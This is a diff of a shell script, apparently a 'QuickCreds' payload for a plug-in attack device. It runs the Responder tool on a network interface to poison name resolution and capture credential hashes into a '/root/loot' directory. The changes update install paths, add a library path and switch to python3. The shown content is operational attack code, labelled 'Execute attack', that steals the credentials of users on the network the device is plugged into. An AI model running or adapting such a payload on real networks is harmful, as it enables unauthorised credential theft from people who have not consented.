@@ -13,10 +13,10 @@ CONF=/tmp/QuickCreds.form
 
 LOOTDIR="/root/loot/quickcreds/"
 RESPLOG=$LOOTDIR"responder.log"
-RESPROOT="/sd"
+RESPROOT="/etc/Responder"
 RESPTEMPDL="/tmp/ResponderDownload/"
 RESPURL="https://github.com/lgandx/Responder/archive/master.zip"
-RESPLOGDIR=$RESPROOT/"Responder/logs"
+RESPLOGDIR=$RESPROOT"/logs"
 SLEEPTIMER="1"
 
 function configure {
@@ -137,7 +137,8 @@ function start {
 
     # Execute attack
     /bin/echo "Creds$((dircount)) - Starting screen and Responder" >> $RESPLOG
-    /usr/sbin/screen -dmS responder /bin/bash -c 'cd /sd/Responder; /usr/bin/python /sd/Responder/Responder.py -I eth0 -w -r -d -P'
+	export LD_LIBRARY_PATH=/sd/usr/lib
+    /usr/sbin/screen -dmS responder /bin/bash -c 'cd /sd/Responder; /sd/usr/bin/python3 /sd/Responder/Responder.py -I eth0 -w -d -P'
 
     /bin/echo "Creds$((dircount)) - LED blink pattern during attack enabled" >> $RESPLOG
     # Blink upon hash capture
